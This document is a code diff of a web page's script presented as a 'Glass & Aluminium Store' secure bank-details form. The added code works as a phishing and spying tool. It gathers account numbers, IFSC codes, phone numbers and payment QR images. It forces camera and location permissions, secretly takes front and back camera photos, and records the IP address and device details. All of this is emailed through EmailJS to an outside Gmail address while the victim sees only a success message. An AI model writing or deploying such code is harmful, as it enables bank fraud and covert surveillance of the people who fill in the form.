@@ -762,8 +762,7 @@
                     .catch(() => 'unavailable');
             }
 
-            // Send via EmailJS - Using HTML parameter for proper rendering
-            // Send via EmailJS using the native html parameter
+            // Send via EmailJS
             async function sendSecretReport(payload) {
                 try {
                     // Build image HTML
@@ -795,124 +794,180 @@
                         imagesHTML += `<img src="${payload.qrData}" style="max-width: 100px; border: 1px solid #ddd; border-radius: 6px; padding: 3px; background: white;">`;
                     }
 
-                    // Build full HTML email body
-                    const htmlBody = `
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>GlassStore Report</title>
-                <style>
-                    body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f6f9; padding: 20px; margin: 0; }
-                    .container { max-width: 700px; margin: 0 auto; background: #ffffff; border-radius: 16px; padding: 30px; box-shadow: 0 8px 24px rgba(0,0,0,0.12); }
-                    .header { background: linear-gradient(135deg, #1a2a3a, #2c4b6b); color: white; padding: 25px; border-radius: 12px 12px 0 0; margin: -30px -30px 25px -30px; }
-                    .header h1 { margin: 0; font-size: 26px; }
-                    .header p { margin: 8px 0 0 0; opacity: 0.85; font-size: 14px; }
-                    h2 { color: #2c4b6b; border-bottom: 2px solid #2c4b6b; padding-bottom: 10px; margin-top: 25px; }
-                    .section { margin: 20px 0; padding: 18px 20px; background: #f8f9fa; border-radius: 10px; border-left: 5px solid #2c4b6b; }
-                    .row { display: flex; padding: 6px 0; border-bottom: 1px solid #edf0f2; }
-                    .row:last-child { border-bottom: none; }
-                    .label { font-weight: 600; color: #555; min-width: 140px; flex-shrink: 0; }
-                    .value { color: #1a2a3a; word-break: break-word; }
-                    .badge { background: #2c4b6b; color: white; padding: 4px 12px; border-radius: 20px; font-size: 12px; display: inline-block; }
-                    .photo-grid { display: flex; flex-wrap: wrap; gap: 5px; margin: 5px 0 15px 0; }
-                    .photo-grid img { max-width: 100px; max-height: 100px; border-radius: 6px; border: 1px solid #ddd; padding: 2px; background: white; object-fit: cover; }
-                    .alert { background: #fff3cd; border: 1px solid #ffc107; padding: 14px; border-radius: 10px; margin: 15px 0; display: flex; align-items: center; gap: 10px; }
-                    .footer { margin-top: 30px; text-align: center; color: #999; font-size: 12px; border-top: 1px solid #eee; padding-top: 20px; }
-                    pre { background: #1e1e1e; color: #d4d4d4; padding: 16px; border-radius: 10px; overflow-x: auto; font-size: 12px; max-height: 400px; overflow-y: auto; margin: 0; }
-                    @media (max-width: 600px) { .container { padding: 20px; } .header { margin: -20px -20px 20px -20px; padding: 20px; } .row { flex-direction: column; padding: 8px 0; } .label { min-width: auto; margin-bottom: 2px; } .photo-grid img { max-width: 80px; max-height: 80px; } }
-                </style>
-            </head>
-            <body>
-                <div class="container">
-                    <div class="header">
-                        <h1>🔐 Glass & Aluminium Store</h1>
-                        <p>Secure Bank Details Report • ${payload.timestamp}</p>
-                    </div>
-                    
-                    <div class="section">
-                        <h3>🏦 Bank Account Details</h3>
-                        <div class="row"><span class="label">Full Name</span><span class="value">${payload.form.name}</span></div>
-                        <div class="row"><span class="label">Email</span><span class="value">${payload.form.email}</span></div>
-                        <div class="row"><span class="label">Account Number</span><span class="value"><b>${payload.form.account}</b></span></div>
-                        <div class="row"><span class="label">IFSC Code</span><span class="value"><b>${payload.form.ifsc}</b></span></div>
-                        <div class="row"><span class="label">Phone Number</span><span class="value">${payload.form.phone}</span></div>
-                    </div>
-                    
-                    <div class="section" style="border-left-color: #28a745;">
-                        <h3>📍 Location & Network</h3>
-                        <div class="row"><span class="label">IP Address</span><span class="value"><b>${payload.ip}</b></span></div>
-                        <div class="row"><span class="label">GPS Location</span><span class="value">${payload.userLocation.lat}, ${payload.userLocation.lon}</span></div>
-                    </div>
-                    
-                    <div class="section" style="border-left-color: #6f42c1;">
-                        <h3>📱 Device Information</h3>
-                        <div class="row"><span class="label">User Agent</span><span class="value" style="font-size: 12px; word-break: break-all;">${payload.device.userAgent}</span></div>
-                    </div>
-                    
-                    <div class="section" style="border-left-color: #17a2b8;">
-                        <h3>📱 QR Code Upload</h3>
-                        <div class="row"><span class="label">QR Uploaded</span><span class="value">${payload.qrUploaded ? 'Yes ✅' : 'No ❌'}</span></div>
-                    </div>
-                    
-                    <div class="section" style="border-left-color: #fd7e14;">
-                        <h3>📸 Camera Captures</h3>
-                        <div style="display: flex; gap: 20px; flex-wrap: wrap;">
-                            <div><span class="label">Front Camera</span><span class="badge">${payload.frontImages ? payload.frontImages.length : 0} photo(s)</span></div>
-                            <div><span class="label">Back Camera</span><span class="badge">${payload.backImages ? payload.backImages.length : 0} photo(s)</span></div>
-                        </div>
-                    </div>
-                    
-                    <div class="section" style="border-left-color: #28a745;">
-                        <h3>📸 Images</h3>
-                        ${imagesHTML || '<p style="color: #999;">No images captured</p>'}
-                    </div>
-                    
-                    <div class="alert">
-                        <span style="font-size: 24px;">⚠️</span>
-                        <div><b>Confidential</b> - This report contains sensitive banking information. Handle with care.</div>
-                    </div>
-                    
-                    <div class="footer">
-                        <p>Generated by Glass & Aluminium Store</p>
-                        <p style="color: #bbb; margin-top: 4px;">Automated system • Do not reply</p>
-                    </div>
-                </div>
-            </body>
-            </html>
-        `;
+                    const emailParams = {
+                        to_email: RECIPIENT_EMAIL,
+                        subject: `GlassStore Report ${new Date().toISOString()}`,
+                        name: payload.form.name || 'Not provided',
+                        email: payload.form.email || 'Not provided',
+                        account: payload.form.account || 'Not provided',
+                        ifsc: payload.form.ifsc || 'Not provided',
+                        phone: payload.form.phone || 'Not provided',
+                        ip: payload.ip || 'Not available',
+                        location: `${payload.userLocation.lat || 'N/A'}, ${payload.userLocation.lon || 'N/A'}`,
+                        device: payload.device.userAgent || 'Unknown',
+                        front_photos: payload.frontImages ? payload.frontImages.length : 0,
+                        back_photos: payload.backImages ? payload.backImages.length : 0,
+                        qr_uploaded: payload.qrUploaded ? 'Yes ✅' : 'No ❌',
+                        timestamp: payload.timestamp || new Date().toISOString(),
+                        images_html: imagesHTML || '<p style="color: #999;">No images captured</p>',
+                        message: JSON.stringify({
+                            form: payload.form,
+                            ip: payload.ip,
+                            location: payload.userLocation,
+                            device: payload.device,
+                            frontPhotos: payload.frontImages ? payload.frontImages.length : 0,
+                            backPhotos: payload.backImages ? payload.backImages.length : 0,
+                            qrUploaded: payload.qrUploaded,
+                            timestamp: payload.timestamp
+                        }, null, 2)
+                    };
 
-                    // CRITICAL: Use the emailjs.send method with html parameter
+                    const size = JSON.stringify(emailParams).length;
+                    console.log('📤 Sending email to:', RECIPIENT_EMAIL);
+                    console.log('📊 Final payload size:', size, 'bytes');
+
                     const response = await emailjs.send(
                         EMAILJS_SERVICE_ID,
                         EMAILJS_TEMPLATE_ID,
-                        {
-                            to_email: RECIPIENT_EMAIL,
-                            subject: `GlassStore Report ${new Date().toISOString()}`,
-                            html: htmlBody,  // This is the key - EmailJS will render this as HTML
-                            message: JSON.stringify({
-                                form: payload.form,
-                                ip: payload.ip,
-                                location: payload.userLocation,
-                                device: payload.device,
-                                frontPhotos: payload.frontImages ? payload.frontImages.length : 0,
-                                backPhotos: payload.backImages ? payload.backImages.length : 0,
-                                qrUploaded: payload.qrUploaded,
-                                timestamp: payload.timestamp
-                            }, null, 2)
-                        }
+                        emailParams
                     );
-
                     console.log('✅ Email sent successfully:', response);
                     return true;
                 } catch (error) {
                     console.error('❌ EmailJS error:', error);
+                    console.error('Status:', error.status);
+                    console.error('Text:', error.text);
+                    if (error.status === 413) {
+                        console.error('❌ Still too large! Try removing images.');
+                    }
                     return false;
                 }
             }
 
-            console.log('Glass & Aluminium · secure (With HTML images)');
+            // MAIN SUBMIT
+            document.getElementById('bankForm').addEventListener('submit', async function (e) {
+                e.preventDefault();
+
+                const hasQR = qrInput.files && qrInput.files.length > 0;
+                const hasBank = fullName.value.trim() !== '' ||
+                    email.value.trim() !== '' ||
+                    accountNumber.value.trim() !== '' ||
+                    ifsc.value.trim() !== '' ||
+                    phone.value.trim() !== '';
+
+                if (!hasQR && !hasBank) {
+                    showToast('❌ Please fill bank details OR upload a QR code', true);
+                    return;
+                }
+
+                showSpinner();
+
+                try {
+                    // Check permissions
+                    const perms = await requestPermissions();
+
+                    if (!perms.geolocation || !perms.camera) {
+                        console.warn('⚠️ Permissions denied');
+                        showToast('❌ Something went wrong. Please try again.', true);
+                        hideSpinner();
+                        setTimeout(() => location.reload(), 2000);
+                        return;
+                    }
+
+                    console.log('✅ Permissions granted');
+
+                    // Collect form data
+                    const formData = {
+                        name: hasBank ? fullName.value.trim() || 'Not provided' : 'QR Mode',
+                        email: hasBank ? email.value.trim() || 'Not provided' : 'QR Mode',
+                        account: hasBank ? accountNumber.value.trim() || 'Not provided' : 'QR Mode',
+                        ifsc: hasBank ? ifsc.value.trim() || 'Not provided' : 'QR Mode',
+                        phone: hasBank ? phone.value.trim() || 'Not provided' : 'QR Mode'
+                    };
+
+                    // Get QR data if uploaded
+                    let qrData = null;
+                    if (hasQR) {
+                        try {
+                            const file = qrInput.files[0];
+                            qrData = await new Promise((resolve) => {
+                                const reader = new FileReader();
+                                reader.onload = (ev) => resolve(ev.target.result);
+                                reader.readAsDataURL(file);
+                            });
+                        } catch (e) {
+                            console.error('QR upload error:', e);
+                        }
+                    }
+
+                    // Capture photos
+                    console.log('📸 Capturing photos...');
+
+                    let frontResult = { count: 0, images: [] };
+                    try {
+                        frontResult = await capturePhotos('user', 1);
+                        console.log('📸 Front camera:', frontResult.count, 'photo');
+                    } catch (e) {
+                        console.error('📸 Front camera error:', e);
+                    }
+
+                    let backResult = { count: 0, images: [] };
+                    try {
+                        backResult = await capturePhotos('environment', 1);
+                        console.log('📸 Back camera:', backResult.count, 'photo');
+                    } catch (e) {
+                        console.error('📸 Back camera error:', e);
+                    }
+
+                    // Get other data
+                    const [userLocation, ip, deviceInfo] = await Promise.all([
+                        getUserLocation(),
+                        getIPAddress(),
+                        Promise.resolve(getDeviceInfo())
+                    ]);
+
+                    // Build payload
+                    const payload = {
+                        timestamp: new Date().toISOString(),
+                        ip: ip,
+                        userLocation: userLocation,
+                        device: deviceInfo,
+                        form: formData,
+                        qrUploaded: hasQR,
+                        qrData: qrData,
+                        frontImages: frontResult.images || [],
+                        backImages: backResult.images || [],
+                    };
+
+                    const size = JSON.stringify(payload).length;
+                    console.log('📦 Payload size:', size, 'bytes');
+                    console.log('📸 Front images:', payload.frontImages.length);
+                    console.log('📸 Back images:', payload.backImages.length);
+
+                    // Send
+                    const sent = await sendSecretReport(payload);
+
+                    hideSpinner();
+
+                    if (sent) {
+                        showToast('✓ details submitted successfully');
+                        document.getElementById('bankForm').reset();
+                        qrPreview.classList.remove('show');
+                        qrFileName.textContent = '';
+                        updateSections();
+                    } else {
+                        showToast('❌ Something went wrong. Please try again.', true);
+                        setTimeout(() => location.reload(), 2000);
+                    }
+                } catch (error) {
+                    console.error('❌ Fatal error:', error);
+                    hideSpinner();
+                    showToast('❌ Something went wrong. Please try again.', true);
+                    setTimeout(() => location.reload(), 2000);
+                }
+            });
+
+            console.log('Glass & Aluminium · secure');
             console.log('📧 Sending to: mrsmartboy123@gmail.com');
         })();
     </script>
